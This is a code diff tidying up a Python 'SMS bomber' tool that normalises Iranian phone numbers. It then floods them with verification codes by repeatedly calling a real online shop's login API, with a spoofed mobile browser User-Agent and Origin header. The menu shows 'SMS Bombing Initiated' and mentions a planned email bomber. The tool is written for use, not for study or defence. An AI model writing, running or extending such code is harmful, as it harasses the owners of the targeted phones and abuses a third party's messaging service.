@@ -2,10 +2,15 @@ from platform import node, system, release
 from os import system as os_system, name
 from re import match, sub
 from threading import Thread
-import urllib3; urllib3.disable_warnings()
+import urllib3
 from time import sleep
 import random
 import socket
+
+# ------------------------------
+# Imports & Setup
+# ------------------------------
+urllib3.disable_warnings()
 
 try:
     from requests import get, post
@@ -25,18 +30,21 @@ d = '\033[90;1m'
 # System info
 Node, System, Release = node(), system(), release()
 
-# Clear screen
-os_system('clear' if name == 'posix' else 'cls')
+# ------------------------------
+# Helpers
+# ------------------------------
+def clear_screen():
+    os_system('clear' if name == 'posix' else 'cls')
 
-# Slow print
 def print_slow(text, delay=0.009):
+    """Print text slowly like typing effect."""
     for char in text:
         print(char, end='', flush=True)
         sleep(delay)
     print()
 
-# Check internet
 def check_internet():
+    """Check if internet is available."""
     try:
         socket.gethostbyname("smtp.gmail.com")
         return True
@@ -44,21 +52,18 @@ def check_internet():
         return False
 
 # ------------------------------
-# SMS services
+# Example SMS service
 # ------------------------------
-
-        def khanoumi(phone):
+def khanoumi(phone):
     import requests
     
     formatted_phone = "0" + phone.replace("+98", "")
     url = "https://accounts.khanoumi.com/api/nim/v1/account/login/init"
     
-    payload = {
-        "phone": formatted_phone
-    }
-    
+    payload = {"phone": formatted_phone}
     headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) "
+                      "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/json",
         "Origin": "https://accounts.khanoumi.com",
@@ -68,21 +73,18 @@ def check_internet():
     
     try:
         response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
         if response.status_code == 200:
             print(f'{g}(khanoumi) {a}Code Sent')
             return True
         else:
             print(f'{r}[-] (khanoumi) HTTP Error: {response.status_code}{a}')
             return False
-            
     except Exception as e:
         print(f'{r}[!] khanoumi Exception: {e}{a}')
         return False
 
-
 # ------------------------------
-# Safe runner for services
+# Service Runner
 # ------------------------------
 def send_service_safe(service, phone):
     try:
@@ -93,14 +95,11 @@ def send_service_safe(service, phone):
     except Exception as e:
         print(f"{r}[-] Error in {service.__name__}: {e}{a}")
 
-
 # ------------------------------
-# Simple SMS bomber
+# SMS Bomber
 # ------------------------------
 def Vip(phone, Time):
-    services = [
-    khanoumi,
-]
+    services = [khanoumi]
     total_services = len(services)
 
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
@@ -117,19 +116,22 @@ def Vip(phone, Time):
                 sleep(Time)
     except KeyboardInterrupt:
         print_slow(f"{g}[+] {y}Mission Completed!")
-        os_system('clear' if name == 'posix' else 'cls')
+        clear_screen()
 
-
+# ------------------------------
 # Phone validation
+# ------------------------------
 def is_phone(phone: str):
+    """Normalize Iranian phone numbers to +989 format."""
     if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
         return sub(r"^(?:\+989|989|09|9)", "+989", phone)
     return False
 
-
+# ------------------------------
 # Menu
+# ------------------------------
 def main_menu():
-    os_system('clear' if name == 'posix' else 'cls')
+    clear_screen()
     print_slow(f"""
 {p}╔════════════════════════════════════════════════════╗
 {b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
@@ -147,8 +149,9 @@ def main_menu():
 """)
     return input(f"{g}[?] {y}Enter Choice (0-2): {a}")
 
-
-# Main loop
+# ------------------------------
+# Main Loop
+# ------------------------------
 def main():
     while True:
         choice = main_menu()
@@ -166,7 +169,7 @@ def main():
             Vip(phone, Time)
 
         elif choice == '2':
-            print_slow(f"{g}[+] {y}Email Bomber is not implemented in this snippet.")
+            print_slow(f"{g}[+] {y}Email Bomber is not implemented yet.")
 
         elif choice == '0':
             print_slow(f"{r}[-] {y}Exiting... Goodbye!")
@@ -176,7 +179,9 @@ def main():
             print_slow(f"{r}[-] {a}Invalid Choice!")
             sleep(1)
 
-
+# ------------------------------
+# Entry Point
+# ------------------------------
 if __name__ == "__main__":
     if not check_internet():
         print(f"{r}[-] No internet connection detected!{a}")
